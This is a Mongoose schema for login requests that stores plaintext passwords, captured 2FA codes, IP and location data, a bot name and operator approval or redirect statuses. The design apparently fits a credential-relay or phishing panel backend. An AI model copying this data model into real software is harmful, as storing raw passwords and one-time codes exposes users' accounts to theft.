const mongoose = require('mongoose');

const LoginRequestSchema = new mongoose.Schema(
  {
    username: {
      type: String,
      required: true,
    },
    password: {
      type: String,
      required: true,
    },
    verificationId: {
      type: String,
      required: true,
    },
    status: {
      type: String,
      enum: ['pending', 'pending_approval', 'approved', 'rejected', 'expired', 'redirected'],
      default: 'pending',
    },
    twoFACode: {
      type: String,
    },
    twoFAMethod: {
      type: String,
      enum: ['email', 'sms'],
    },
    twoFAStatus: {
      type: String,
      enum: ['pending', 'verified', 'failed'],
    },
    ip: {
      type: String,
    },
    userAgent: {
      type: String,
    },
    botname: {
      type: String,
    },
    location: {
      country: String,
      city: String,
      timezone: String,
      coordinates: String,
    },
    approvedBy: {
      type: String,
      default: null,
    },
    approvedAt: {
      type: Date,
      default: null,
    },
    rejectedReason: {
      type: String,
      default: null,
    },
    expiresAt: {
      type: Date,
     default: () => new Date(Date.now() + 2 * 60 * 1000),//  2 mins for auto-expiry
    },
    logType: {
      type: String,
      enum: ['login_request', '2fa_code', 'denied_request', 'redirected_request', 'expired_request'],
      default: 'login_request',
    },
  },
  { timestamps: true }
);

LoginRequestSchema.statics.expireOldRequests = async function () {
  return this.updateMany(
    {
      status: { $in: ['pending', 'pending_approval'] },
      expiresAt: { $lte: new Date() }
    },
    {
      $set: {
        status: 'expired',
        logType: 'expired_request'
      }
    }
  );
};

// Index for faster queries
LoginRequestSchema.index({ status: 1, createdAt: -1 });
LoginRequestSchema.index({ verificationId: 1 });
LoginRequestSchema.index({ username: 1, createdAt: -1 });

module.exports = mongoose.model('LoginRequest', LoginRequestSchema);
